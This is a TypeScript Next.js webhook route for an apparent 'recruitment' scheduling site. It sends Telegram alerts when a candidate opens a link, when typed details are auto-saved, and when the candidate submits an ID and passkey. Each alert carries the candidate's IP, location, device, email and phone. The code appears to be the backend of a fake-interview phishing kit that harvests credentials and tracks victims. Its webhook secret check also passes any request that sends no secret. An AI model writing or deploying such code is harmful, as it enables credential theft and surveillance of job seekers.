import { NextRequest, NextResponse } from "next/server";

function escapeHtml(str: string): string {
  if (!str) return "";
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

async function resolveIpAndLocation(req: NextRequest, record: Record<string, any>) {
  let ip = record.ip_address || "";
  let city = record.city || "";
  let state = record.state || "";
  let country = record.country || "";

  // 1. If IP is missing in record, extract from request headers
  if (!ip || ip === "Unknown IP" || ip === "null") {
    ip =
      req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
      req.headers.get("x-real-ip") ||
      req.headers.get("cf-connecting-ip") ||
      req.headers.get("x-client-ip") ||
      "";
  }

  // 2. If location is missing, check edge headers
  if (!city) {
    city = req.headers.get("x-vercel-ip-city") || "";
    if (city) city = decodeURIComponent(city);
  }
  if (!state) {
    state = req.headers.get("x-vercel-ip-country-region") || "";
    if (state) state = decodeURIComponent(state);
  }
  if (!country) {
    country = req.headers.get("x-vercel-ip-country") || "";
    if (country) country = decodeURIComponent(country);
  }

  // 3. Fallback geo lookup if IP exists and location is still missing
  const isLocal =
    !ip ||
    ip === "::1" ||
    ip === "127.0.0.1" ||
    ip.startsWith("192.168.") ||
    ip.startsWith("10.");

  if ((!city || !country) && !isLocal && ip) {
    try {
      const geoRes = await fetch(`https://ipapi.co/${ip}/json/`, {
        headers: { "User-Agent": "recruitment-app/1.0" },
        cache: "no-store",
      });
      if (geoRes.ok) {
        const d = await geoRes.json();
        if (d && !d.error) {
          city = city || d.city || "";
          state = state || d.region || d.region_code || "";
          country = country || d.country_name || d.country || "";
        }
      }
    } catch {}
  }

  // 4. Secondary fallback if local dev
  if (isLocal && !city) {
    try {
      const altRes = await fetch("https://ipwho.is/", { cache: "no-store" });
      if (altRes.ok) {
        const d = await altRes.json();
        if (d && d.success !== false) {
          ip = ip && !isLocal ? ip : d.ip || ip;
          city = city || d.city || "";
          state = state || d.region || d.region_code || "";
          country = country || d.country || d.country_code || "";
        }
      }
    } catch {}
  }

  const locParts = [city, state, country].filter(Boolean);
  const locationStr = locParts.length > 0 ? locParts.join(", ") : "Unknown Location";

  return {
    ip: ip || "Unknown IP",
    city: city || "",
    state: state || "",
    country: country || "",
    location: locationStr,
  };
}

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();

    // 1. Validate Secret if configured
    const secret = req.headers.get("x-webhook-secret");
    const configuredSecret = process.env.TELEGRAM_WEBHOOK_SECRET;
    if (configuredSecret && secret && secret !== configuredSecret) {
      return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
    }

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const rawChatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !rawChatId) {
      console.warn("Telegram Bot Token or Chat ID not configured in environment variables.");
      return NextResponse.json(
        { message: "Telegram credentials not configured on server, notification skipped" },
        { status: 200 }
      );
    }

    const chatIds = rawChatId
      .split(/[,\s]+/)
      .map((id) => id.trim())
      .filter(Boolean);

    if (chatIds.length === 0) {
      return NextResponse.json(
        { message: "No valid Telegram chat IDs found" },
        { status: 200 }
      );
    }

    // 2. Determine event type & record
    const record = body.record || body;
    const geo = await resolveIpAndLocation(req, record);

    const isVisit =
      body.table === "schedule_visits" ||
      body.type === "schedule_visit" ||
      (!body.table && record.session_id && !record.date && !record.candidate_id);

    const isDraft =
      body.type === "candidate_draft" ||
      (body.table === "bookings" && !record.candidate_id && !record.passkey);

    const isBooking =
      body.table === "bookings" ||
      body.type === "booking" ||
      body.type === "booking_created" ||
      body.type === "INSERT" ||
      Boolean(record.candidate_id || record.passkey);

    let messageHtml = "";

    if (isVisit) {
      const interviewer = record.interviewer_name || "Recruiting Team";
      const adminEmail = record.admin_email ? ` (${record.admin_email})` : "";
      const timezone = record.timezone || "Unknown";
      const userAgent = record.user_agent
        ? record.user_agent.length > 80
          ? record.user_agent.substring(0, 80) + "..."
          : record.user_agent
        : "Unknown";

      const time = new Date(record.created_at || Date.now()).toLocaleTimeString("en-US", {
        timeZone: "America/New_York",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
      });

      messageHtml =
        `⚡ <b>Candidate Opened Scheduling Link!</b>\n\n` +
        `👤 <b>Interviewer Link:</b> ${escapeHtml(interviewer)}${escapeHtml(adminEmail)}\n` +
        `📍 <b>Location:</b> ${escapeHtml(geo.location)}\n` +
        `🌐 <b>IP Address:</b> <code>${escapeHtml(geo.ip)}</code>\n` +
        `🕒 <b>Time:</b> ${time} (New York / EST)\n` +
        `🌍 <b>Timezone:</b> <code>${escapeHtml(timezone)}</code>\n` +
        `📱 <b>Device / Browser:</b> <code>${escapeHtml(userAgent)}</code>`;
    } else if (isDraft) {
      const candidateName =
        `${record.first_name || ""} ${record.last_name || ""}`.trim() || "Candidate";
      const email = record.email || "N/A";
      const phone = record.phone_number || record.phone || "N/A";
      const date = record.date || record.scheduled_date || "N/A";
      const time = record.start_time || record.scheduled_time || "N/A";
      const interviewer = record.interviewer_name || "Recruiting Team";
      const adminEmail = record.admin_email ? ` (${record.admin_email})` : "";

      messageHtml =
        `📝 <b>Candidate Details Entered (Auto-Saved)!</b>\n\n` +
        `👤 <b>Candidate:</b> ${escapeHtml(candidateName)}\n` +
        `📧 <b>Email:</b> <code>${escapeHtml(email)}</code>\n` +
        `📞 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
        `📍 <b>Location:</b> ${escapeHtml(geo.location)}\n` +
        `🌐 <b>IP Address:</b> <code>${escapeHtml(geo.ip)}</code>\n` +
        `📅 <b>Date & Time:</b> ${escapeHtml(date)} at ${escapeHtml(time)}\n` +
        `👔 <b>Interviewer:</b> ${escapeHtml(interviewer)}${escapeHtml(adminEmail)}\n` +
        `🔒 <b>Status:</b> In ID/Passkey Modal`;
    } else if (isBooking) {
      const candidateName =
        `${record.first_name || ""} ${record.last_name || ""}`.trim() || "Candidate";
      const email = record.email || "N/A";
      const phone = record.phone_number || record.phone || "N/A";
      const date = record.date || record.scheduled_date || "N/A";
      const time = record.start_time || record.scheduled_time || "N/A";
      const interviewer = record.interviewer_name || "Recruiting Team";
      const adminEmail = record.admin_email ? ` (${record.admin_email})` : "";
      const candidateId = record.candidate_id || "N/A";
      const passkey = record.passkey || "N/A";

      messageHtml =
        `🎉 <b>Candidate Submitted ID & Passkey!</b>\n\n` +
        `👤 <b>Candidate:</b> ${escapeHtml(candidateName)}\n` +
        `📧 <b>Email:</b> <code>${escapeHtml(email)}</code>\n` +
        `📞 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
        `🔑 <b>Candidate ID:</b> <code>${escapeHtml(candidateId)}</code>\n` +
        `🏷 <b>Passkey:</b> <code>${escapeHtml(passkey)}</code>\n` +
        `📍 <b>Location:</b> ${escapeHtml(geo.location)}\n` +
        `🌐 <b>IP Address:</b> <code>${escapeHtml(geo.ip)}</code>\n` +
        `📅 <b>Date & Time:</b> ${escapeHtml(date)} at ${escapeHtml(time)}\n` +
        `👔 <b>Interviewer:</b> ${escapeHtml(interviewer)}${escapeHtml(adminEmail)}`;
    } else {
      messageHtml = `🔔 <b>Recruitment Notification:</b>\n<pre>${escapeHtml(
        JSON.stringify(record, null, 2)
      )}</pre>`;
    }

    // 3. Send message via Telegram Bot API to all configured chat IDs (User + Group)
    const sendResults = await Promise.allSettled(
      chatIds.map(async (targetChatId) => {
        const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: targetChatId,
            text: messageHtml,
            parse_mode: "HTML",
          }),
        });
        const data = await res.json();
        if (!data.ok) {
          console.error(`Telegram API error for chat_id ${targetChatId}:`, data);
        }
        return data;
      })
    );

    return NextResponse.json({ success: true, count: chatIds.length, results: sendResults });
  } catch (err: any) {
    console.error("Webhook processing error:", err);
    return NextResponse.json({ error: err.message || "Internal Server Error" }, { status: 500 });
  }
}

